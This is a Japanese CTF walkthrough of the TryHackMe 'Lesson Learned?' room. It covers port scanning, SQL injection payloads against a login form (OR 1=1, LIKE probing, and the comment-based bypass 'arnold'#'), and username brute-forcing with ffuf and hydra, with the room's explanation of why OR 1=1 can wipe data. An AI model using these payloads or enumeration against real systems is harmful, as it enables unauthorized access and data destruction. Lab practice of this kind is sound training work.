# Lesson Learned? CTF

https://tryhackme.com/room/lessonlearned

## Enumeration

### ポートスキャン

```shell
TARGET=10.10.50.76
root@ip-10-10-34-46:~# sudo nmap -sS -p- $TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2025-02-12 05:23 GMT
Nmap scan report for 10.10.50.76
Host is up (0.0029s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 02:75:CA:96:7B:9B (Unknown)
```

## SQLi

```http
username=aaa&password=bbb

Invalid username and password.
```

```http
username=admin' or '1' = '1&password=bbb

<div id="error">
Oops! It looks like you injected an <strong class="highlight">OR 1=1</strong> or similar into the username field. This wouldn't have bypassed the login because every row in the users table was returned, and the login check only proceeds if one row matches the query.<br /><br />
However, your injection also made it into a DELETE statement, and now the flag is gone. Like, completely gone. You need to reset the box to restore it, sorry.<br /><br />
<strong class="highlight">OR 1=1</strong> is dangerous and should almost never be used for precisely this reason. Not even SQLmap uses OR unless you set --risk=3 (the maximum). Be better. Be like SQLmap.<br /><br />
Lesson learned?<br /><br />
<small>P.S. maybe there is less destructive way to bypass the login...</small></div>
```

```http
username=admin' or username like 'a%&password=bbb

invalid password
```

```http
username=aaa' or username like 'a_____' and password like '%&password=abc

Invalid password.
```

a から始まる 6 文字のユーザー名が存在することが分かる。

xato-net-10-million-usernames.txt からその条件で絞る。

```shell
$ grep -E "^a.{5}$" /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt > users.txt

$ ffuf -w users.txt -X POST -d "username=FUZZ&password=aaa" -u http://10.10.127.164/ -mr "Invalid username and password"

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : POST
 :: URL              : http://10.10.127.164/
 :: Wordlist         : FUZZ: /home/kali/CTF/users.txt
 :: Data             : username=FUZZ&password=aaa
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Regexp: Invalid username and password
________________________________________________

:: Progress: [52695/52695] :: Job [1/1] :: 38 req/sec :: Duration: [0:06:05] :: Errors: 0 ::
```

見つからなかった。

```shell
$ hydra -L users.txt -p aaa 10.10.127.164 http-post-form "/:username=^USER^&password=^PASS^:Invalid username and password."
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-02-12 02:17:26
[DATA] max 16 tasks per 1 server, overall 16 tasks, 52695 login tries (l:52695/p:1), ~3294 tries per task
[DATA] attacking http-post-form://10.10.127.164:80/:username=^USER^&password=^PASS^:Invalid username and password.
[80][http-post-form] host: 10.10.127.164   login: arnold   password: aaa
[STATUS] 730.00 tries/min, 730 tries in 00:01h, 51965 to do in 01:12h, 16 active
```

hydra で試すと、arnold ユーザーが見つかった。

```shell
username=arnold' and password like 'd_________________________________________&password=abc

Invalid password.
```

password 列に 42 桁の文字列が入っている。  
何かのハッシュかと思ったが、42 桁は一般的なハッシュではない。

ユーザー名の後に SQL コメントを注入する。

```html
username=arnold'#&password=aaa

<body>
  <div id="success">
    <h1>THM{aa.....}</h1>
    Well done! You bypassed the login without deleting the flag!
    <br /><br />
    If you're confused by this message, you probably didn't even try an SQL
    injection using something like <strong class="highlight">OR 1=1</strong>.
    Good for you, you didn't need to learn the lesson. <br /><br />
    For everyone else who had to reset the box...lesson learned?
    <br /><br />
    Using <strong class="highlight">OR 1=1</strong> is risky and should rarely
    be used in real world engagements. Since it loads all rows of the table, it
    may not even bypass the login, if the login expects only 1 row to be
    returned. Loading all rows of a table can also cause performance issues on
    the database. However, the real danger of
    <strong class="highlight">OR 1=1</strong> is when it ends up in either an
    UPDATE or DELETE statement, since it will cause the modification or deletion
    of every row. <br /><br />
    For example, consider that after logging a user in, the application re-uses
    the username input to update a user's login status:
    <strong class="highlight code"
      >UPDATE users SET online=1 WHERE username='&lt;username&gt;';</strong
    >
    <br /><br />
    A successful injection of <strong class="highlight">OR 1=1</strong> here
    would cause every user to appear online. A similar DELETE statement,
    possibly to delete prior session data, could wipe session data for all users
    of the application. <br /><br />
    Consider using <strong class="highlight">AND 1=1</strong> as an alternative,
    with a valid input (in this case a valid username) to test / confirm SQL
    injection.
  </div>
</body>
```

## 振り返り

- or 1 = 1 は（Delete 等でも使われるかもしれず）危険だから基本的に使うな、SQLi を確認したい場合は代わりに AND 1 = 1 を使うように、という教訓。
- それはそれとして、ユーザー名の後に SQL コメントを注入することで認証をバイパスできる点は、腑に落ちない。
- コメント以降が無視されるという意味で、下記 1 番目のような形を想定できるが、こういう実装であれば、ユーザー名とパスワードのどちらが間違っているか、判別できないと考えるのが自然ではないか？だから 2 番目のようなフローを想像していた。

```sql
select username from users where username = 'arnold'# and password = 'aaa';
```

```python
select password from users where username = 'arnold';
if (結果が0件) {
    # Invalid username and password
}
if (password == $password) {
    # Invalid password
}
```

### 検証：ffuf で arnold ユーザーがヒットしなかった件

データ部分の形式を指定しなかったのが原因か？

```shell
$ ffuf -w users.txt -X POST -d "username=FUZZ&password=aaa" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.127.164/ -fr "Invalid username and password"

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : POST
 :: URL              : http://10.10.127.164/
 :: Wordlist         : FUZZ: /home/kali/CTF/users.txt
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Data             : username=FUZZ&password=aaa
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Regexp: Invalid username and password
________________________________________________

arnold                  [Status: 200, Size: 1240, Words: 36, Lines: 32, Duration: 4507ms]
```

検出された。Content-Type を指定しなければならなかった。  
それと、除外したいので、-mr ではなく -fr が正しかった。
